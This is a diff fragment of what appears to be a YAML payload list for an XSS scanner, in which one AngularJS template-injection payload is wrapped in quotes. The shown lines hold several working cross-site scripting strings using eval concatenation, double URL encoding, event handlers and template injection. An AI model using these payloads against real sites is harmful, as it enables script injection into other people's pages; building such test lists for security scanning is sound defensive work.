@@ -133,7 +133,7 @@ payload:
   - eval('al'+'ert'+'(12)');//
   - 1&a%2522%253e%253cscript%253ealert%2528/xss/%2529%253c%252fscript%253e
   - x'%2520onclick='confirm%601%60'
-  - {{constructor.constructor(alert`1`)()}}
+  - '{{constructor.constructor(alert`1`)()}}'
   - 253C%252Fscript%253E%253Cscript%253Ealert%2528%2527XSS%2520here%2521%2527%2529%253C%252Fscript%253E
 encoder:
   - URL
